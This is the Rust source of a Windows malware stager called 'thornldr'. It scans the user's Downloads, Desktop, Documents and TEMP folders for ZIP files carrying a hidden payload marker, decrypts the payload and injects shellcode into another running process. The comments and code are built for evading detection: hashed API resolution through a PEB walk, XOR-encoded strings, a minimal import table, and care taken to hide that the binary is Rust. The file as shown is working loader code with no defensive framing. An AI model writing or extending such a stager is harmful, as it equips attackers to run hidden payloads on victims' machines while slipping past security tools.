// main.rs — thornldr_stager
//
// Tiny no_std, no-CRT Rust PE stager. Flow:
//
//   1. Read %USERPROFILE% and %TEMP% via GetEnvironmentVariableW.
//   2. For each candidate directory (Downloads / Desktop / Documents / TEMP
//      / current exe dir), enumerate *.zip files and search each for the
//      THORNPLD magic.
//   3. On hit, extract the encrypted blob (length prefix + body), decrypt
//      it in place with the selected crypto component (AES-256-CBC today).
//   4. Apply the thornldr XOR decoder patch (matches dynamic_inject).
//   5. Enumerate running processes, score against the candidate list
//      baked into STAGER_CONFIG, pick the best match in our session.
//   6. Section-map the shellcode into the target and kick a thread.
//
// All Win32 APIs are resolved at runtime via PEB walk + DJB2 hash for
// LoadLibraryA / GetProcAddress, then XOR-encoded names for everything
// else. No Rust std, no mingw CRT, no backtrace machinery, no `/rustc/`
// library paths, minimal IAT — the PE features look nothing like a
// typical Rust binary.

#![no_std]
#![no_main]

mod api_hash;
mod peb_walk;
mod resolver;
mod fs;
mod crypto;
mod enum_procs;
mod inject;
mod config;

use core::panic::PanicInfo;
use core::ffi::c_void;
use core::sync::atomic::AtomicPtr;

use crate::resolver::{resolve_cached, xor_const, ENC_KERNEL32};

// ── ExitProcess (lazy resolver) ─────────────────────────────────────────────
type FnExitProcess = unsafe extern "system" fn(u32) -> !;
static SLOT_EXIT: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
const ENC_EXIT: [u8; 12] = xor_const(*b"ExitProcess\0");

unsafe fn exit_process(code: u32) -> ! {
    let p = resolve_cached(&SLOT_EXIT, &ENC_KERNEL32, &ENC_EXIT);
    if !p.is_null() {
        let f: FnExitProcess = core::mem::transmute(p);
        f(code);
    }
    // Fallback: spin. Should never happen — kernel32 always exports ExitProcess.
    loop { core::hint::spin_loop(); }
}

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    unsafe { exit_process(1) }
}

// ── THORNPLD magic (XOR(0x37) encoded to stay out of .rdata plaintext) ──────
const STR_KEY: u8 = 0x37;

// ── File buffer (static .bss, 4 MiB) ────────────────────────────────────────
// Using a static buffer rather than alloc keeps HeapAlloc out of the IAT
// and prevents the stager from advertising a Rust-style allocator.
const FILE_BUF_SIZE: usize = 4 * 1024 * 1024;
static mut FILE_BUF: [u8; FILE_BUF_SIZE] = [0; FILE_BUF_SIZE];

/// Apply the thornldr XOR decoder patch (same as dynamic_inject). The blob
/// format begins with an `EB 0E` jump; we decrypt the PE payload using the
/// embedded per-build XOR key at offset 45, then patch the jump to skip
/// the decoder stub.
unsafe fn apply_thornldr_decoder(blob: &mut [u8]) -> usize {
    if blob.len() < 56 || blob[0] != 0xEB || blob[1] != 0x0E {
        return blob.len();
    }
    let xor_key = blob[45];
    let pe_offset = u32::from_le_bytes([blob[8], blob[9], blob[10], blob[11]]) as usize;
    let pe_size   = u32::from_le_bytes([blob[12], blob[13], blob[14], blob[15]]) as usize;
    let decode_end = pe_offset.saturating_add(pe_size);
    if decode_end <= blob.len() {
        let mut i = 56;
        while i < decode_end {
            blob[i] ^= xor_key;
            i += 1;
        }
    }
    // Patch: `EB 0E` (→ decoder) → `EB 36` (→ stub at offset 56 directly).
    blob[1] = 0x36;
    blob.len()
}

// ── Entry point ─────────────────────────────────────────────────────────────
#[no_mangle]
pub extern "system" fn stager_entry() -> ! {
    unsafe { run() }
}

unsafe fn run() -> ! {
    // Decode THORNPLD magic on the stack via black_box so LTO can't
    // const-fold the XOR back to the plaintext literal.
    const MAGIC_ENC: [u8; 8] = [
        b'T' ^ STR_KEY, b'H' ^ STR_KEY, b'O' ^ STR_KEY, b'R' ^ STR_KEY,
        b'N' ^ STR_KEY, b'P' ^ STR_KEY, b'L' ^ STR_KEY, b'D' ^ STR_KEY,
    ];
    let enc = core::hint::black_box(MAGIC_ENC);
    let mut magic = [0u8; 8];
    let mut i = 0;
    while i < 8 {
        magic[i] = enc[i] ^ core::hint::black_box(STR_KEY);
        i += 1;
    }

    // Read USERPROFILE and TEMP from the environment.
    let mut userprofile: [u16; 320] = [0; 320];
    let have_profile = fs::get_env_w(b"USERPROFILE", &mut userprofile);
    let mut temp: [u16; 320] = [0; 320];
    let have_temp = fs::get_env_w(b"TEMP", &mut temp);

    // Candidate directories: %USERPROFILE%\Downloads, Desktop, Documents, %TEMP%.
    let suffixes: [&[u8]; 3] = [b"\\Downloads", b"\\Desktop", b"\\Documents"];

    let file_buf = &mut *core::ptr::addr_of_mut!(FILE_BUF);
    let mut hit: Option<(usize, usize)> = None;

    if have_profile {
        for suffix in &suffixes {
            let mut dir: [u16; 384] = [0; 384];
            // Copy userprofile.
            let pl = fs::wstrlen(userprofile.as_ptr());
            if pl + suffix.len() + 1 > dir.len() { continue; }
            let mut j = 0;
            while j < pl { dir[j] = userprofile[j]; j += 1; }
            let mut k = 0;
            while k < suffix.len() { dir[j + k] = suffix[k] as u16; k += 1; }
            dir[j + suffix.len()] = 0;

            if let Some(pair) = fs::find_thornpld_zip(dir.as_ptr(), file_buf, &magic) {
                hit = Some(pair);
                break;
            }
        }
    }
    if hit.is_none() && have_temp {
        hit = fs::find_thornpld_zip(temp.as_ptr(), file_buf, &magic);
    }

    let (len, pos) = match hit { Some(p) => p, None => exit_process(0) };

    // Decrypt the blob. Layout (matches stager.js packaging):
    //   [pos..pos+8]       = THORNPLD magic
    //   [pos+8..pos+12]    = u32 little-endian length of encrypted body
    //   [pos+12..pos+12+L] = AES-256-CBC(PKCS7) encrypted blob
    if pos + 12 > len { exit_process(0); }
    let enc_len = u32::from_le_bytes([
        file_buf[pos+8], file_buf[pos+9], file_buf[pos+10], file_buf[pos+11],
    ]) as usize;
    if pos + 12 + enc_len > len { exit_process(0); }

    let start = pos + 12;
    let end   = start + enc_len;
    let key = config::key();
    let iv  = config::iv();

    // decrypt_in_place overwrites file_buf[start..end] with plaintext and
    // returns the plaintext length (PKCS7 stripped).
    let pt_len = match crypto::decrypt_in_place(key, iv, &mut file_buf[start..end]) {
        Some(n) => n,
        None => exit_process(0),
    };

    // Apply the thornldr XOR decoder patch in place on the plaintext region.
    let sc_len = apply_thornldr_decoder(&mut file_buf[start..start + pt_len]);

    // Pick a target process — skipped when the inject variant spawns its own child.
    let (pid, hproc) = if inject::SPAWNS_OWN_TARGET {
        (0u32, core::ptr::null_mut())
    } else {
        let cand = config::candidates();
        let p = match enum_procs::pick_target(cand) {
            Some(p) => p,
            None => exit_process(0),
        };
        let h = match enum_procs::open_for_inject(p) {
            Some(h) => h,
            None => exit_process(0),
        };
        (p, h)
    };

    let _ok = inject::run(pid, hproc, &file_buf[start..start + sc_len]);
    if !hproc.is_null() { enum_procs::close_handle(hproc); }

    exit_process(0)
}
